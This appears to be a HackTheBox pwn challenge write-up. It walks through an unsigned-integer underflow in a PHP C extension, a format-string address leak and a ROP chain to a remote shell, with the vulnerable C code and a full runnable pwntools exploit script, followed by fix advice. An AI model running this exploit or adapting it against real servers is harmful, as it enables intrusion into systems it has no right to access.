---
layout: post
title: "Superfast"
date: 2027-11-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, integer-underflow, buffer-overflow, format-string, rop, pie, php-extension]
---

A "C2 check-in" web service turns out to be PHP's built-in dev server (`php -S`) loading a custom **C extension**. The exposed `log_cmd()` function has a textbook bug in its C source, and because the extension is compiled with stack protections off, that bug is a clean [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) → format-string leak → ROP → remote shell.

## Overview

**Category:** Pwn · **Difficulty:** Easy. We're given the extension source (via an exposed `.git`) plus the running service. The path: an [unsigned integer underflow](https://cwe.mitre.org/data/definitions/191.html) in a bounds check lets a long request overflow a 64-byte stack buffer; a `php_printf` gadget leaks the PIE base via a [format string](https://cwe.mitre.org/data/definitions/134.html); and because `php -S` is a single persistent process, ASLR stays constant between two requests — leak, then ROP to `execve("/bin/sh")`.

## The technique

The vulnerable function lives in `php_logger.so`:

```c
zend_string* decrypt(char* buf, size_t size, uint8_t key) {
    char buffer[64] = {0};
    if (sizeof(buffer) - size > 0) {      // BUG
        memcpy(buffer, buf, size);
    } else {
        return NULL;
    }
    for (int i = 0; i < sizeof(buffer) - 1; i++) buffer[i] ^= key;  // only buffer[0..62]
    return zend_string_init(buffer, strlen(buffer), 0);
}
```

`sizeof(buffer)` is `64` and `size` is a `size_t` (**unsigned**). The author meant "only copy when the input fits in 64 bytes," but `sizeof(buffer) - size` is unsigned arithmetic: when `size > 64`, `64 - size` wraps to a gigantic positive number, so `> 0` is always true and `memcpy` copies `size` bytes into the 64-byte buffer.

The `config.m4` compiles the extension with `-fno-stack-protector -fomit-frame-pointer -O0` → no canary, no saved RBP. So overflowing `buffer` gives direct control of `decrypt`'s saved return address, which sits at `buffer+0x98`. Two more gifts:

- The XOR loop only touches `buffer[0..62]`, so a ROP chain placed past offset 62 is copied **verbatim** (no need to pre-encode it).
- `void print_message(char* p){ php_printf(p); }` — `php_printf` with an attacker-controlled format string writes straight into the HTTP response. That's our PIE leak.

## Solution

**Stage 1 — leak the PIE base.** Overwrite *only the low byte* of the saved return address so `...1429` becomes `...1440`, landing on the `call print_message`. At that instant `rdi` points at the freshly XOR-decrypted heap string, so we plant `"%p|%p|..."` there (pre-XORed with the key so it decrypts back), and read the stack out of the response. One leaked `.data` pointer has a known offset, giving the base:

```python
php_base = data_leak - 0x1420b80   # data_leak = the leaked pointer whose low 12 bits == 0xb80
```

**Stage 2 — ROP to a shell.** `php -S` never forks, so the base is identical on the next request. The accepted client socket is fd 4, so we `dup2` it onto std{in,out,err} and `execve("/bin/sh")` — the shell then talks back over the same HTTP connection.

The full, runnable solver:

```python
#!/usr/bin/env python3
import sys, time, requests
from urllib.parse import quote
from pwn import *

context.clear(arch='amd64', log_level='info')
HOST, PORT = sys.argv[1], int(sys.argv[2])
KEY = 1
CONNFD = 4

OFF_DATA  = 0x1420b80
g_pop_rdi = 0x20816b
g_pop_rsi = 0x2043fc
g_pop_rdx = 0x20487c
g_pop_rax = 0x208d99
g_syscall = 0x218481
plt_dup2  = 0x201be0
str_binsh = 0x903fc3

def leak_base():
    fmt = (b"%p|" * 21)[:63]                  # 63 bytes -> inside the XOR window
    enc = bytes(b ^ KEY for b in fmt)         # pre-XOR so the heap string decrypts to the format string
    pl  = enc + b"A" * (0x98 - len(enc)) + b"\x40"   # 1-byte partial RIP overwrite -> call print_message
    r = requests.get(f"http://{HOST}:{PORT}/?cmd={quote(pl, safe='')}",
                     headers={"CMD_KEY": str(KEY)}, timeout=15)
    leaks = [int(p, 16) for p in r.text.split("|") if p.startswith("0x")]
    data_ptr = next(v for v in leaks if v & 0xfff == (OFF_DATA & 0xfff) and (v >> 44) == 5)
    base = data_ptr - OFF_DATA
    assert base & 0xfff == 0, f"bad base {hex(base)}"
    log.success(f"php base = {hex(base)}")
    return base

def pwn(base):
    a = lambda x: p64(base + x)
    chain = b""
    for fd_target in (0, 1, 2):               # dup2(connfd, 0/1/2)
        chain += a(g_pop_rdi) + p64(CONNFD) + a(g_pop_rsi) + p64(fd_target) + a(plt_dup2)
    chain += a(g_pop_rdi) + p64(base + str_binsh) + a(g_pop_rsi) + p64(0)
    chain += a(g_pop_rdx) + p64(0) + a(g_pop_rax) + p64(59) + a(g_syscall)   # execve("/bin/sh",0,0)
    pl  = b"A" * 0x98 + chain
    req = b"GET /?cmd=" + quote(pl, safe="").encode() + b" HTTP/1.1\r\nHost: x\r\nCMD_KEY: 1\r\n\r\n"
    io = remote(HOST, PORT)
    io.send(req)
    time.sleep(1.5)
    io.sendline(b"cat /flag.txt")
    return io

if __name__ == "__main__":
    io = pwn(leak_base())
    io.interactive()
```

Gadget offsets come from the exact `php` interpreter pulled out of the Dockerfile's base image (`docker create <image>; docker cp <cid>:/usr/local/bin/php ./php`). Running it drops a shell as `ctf`; `cat /flag.txt` returns the flag (`HTB{...}`).

## Why it worked

C's unsigned `size_t` arithmetic turned a "bounds check" into an always-true guard, and the extension was compiled with every stack protection explicitly disabled — so the overflow is a clean classic stack smash. The dev server's single-process model makes a two-request leak-then-pwn trivial, because no fork means stable ASLR.

## Fix / defense

- Compare with the right direction and signedness: `if (size < sizeof(buffer))` — never compute `sizeof(x) - n > 0` on unsigned values.
- Keep `-fstack-protector-strong` and the default `-D_FORTIFY_SOURCE=2`, which would have flagged the unbounded `memcpy`.
- Never pass user input as a `printf` format string — use `php_printf("%s", p)`.
- Don't run real services on `php -S` (dev-only, single process, no isolation).
